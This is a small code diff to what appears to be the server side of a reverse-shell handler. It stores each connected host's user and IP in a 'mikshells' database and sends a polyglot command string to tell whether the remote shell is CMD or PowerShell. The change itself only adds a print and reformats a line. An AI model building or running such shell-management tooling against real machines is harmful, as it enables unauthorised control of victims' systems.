@@ -25,6 +25,7 @@ onlines = {}
 
 
 def client_handler(connection):
+    print("connection")
     con = sqlite3.connect('mikshells.db')
     cur = con.cursor()
 
@@ -41,7 +42,8 @@ def client_handler(connection):
                     (whoami+" "+connection.getpeername()[0], ))
         con.commit()
         connection.send("(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell".encode("utf-8"))
-        shelltype = connection.recv(2048*8).decode("utf-8")
+        shelltype = connection.recv(2048*8
+         ).decode("utf-8")
         shelltype = json.loads(shelltype)["out"].replace("\n", "").replace("\r", "")
         startup_steps = []
         if shelltype == "CMD":
